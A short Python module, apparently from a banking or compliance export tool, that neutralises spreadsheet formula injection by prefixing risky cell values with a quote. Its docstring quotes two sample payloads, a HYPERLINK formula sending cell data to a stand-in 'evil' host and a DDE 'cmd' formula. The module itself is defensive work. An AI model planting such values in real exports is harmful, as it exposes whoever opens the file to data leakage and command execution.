"""
Spreadsheet formula-injection guard (SEC-08).

A spreadsheet cell whose text begins with one of ``= + - @`` (or a leading tab /
carriage-return that Excel strips before parsing) is interpreted as a FORMULA
when the file is opened. So a customer-supplied value such as
``=HYPERLINK("http://evil"&A1)`` or ``=cmd|'/c calc'!A1`` — a name, address,
employer, form link, etc. — becomes a live formula in whoever opens the export
(a bank officer, an auditor, a regulator). Prefix any such value with a single
quote so the spreadsheet treats it as literal text; the quote itself is not
displayed and it also stops Excel mangling things like long phone numbers.

Use ``formula_guard`` for a single value (csv.writer rows) and ``harden_df`` for
a whole pandas frame before ``to_excel``.
"""

from __future__ import annotations

_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def formula_guard(v):
    """Neutralise one cell value; non-strings and safe strings pass through."""
    if isinstance(v, str) and v and v[0] in _FORMULA_LEAD:
        return "'" + v
    return v


def harden_df(df):
    """Neutralise every text column of a pandas export frame, in place-ish."""
    for col in df.columns:
        if df[col].dtype == object:
            df[col] = df[col].map(formula_guard)
    return df
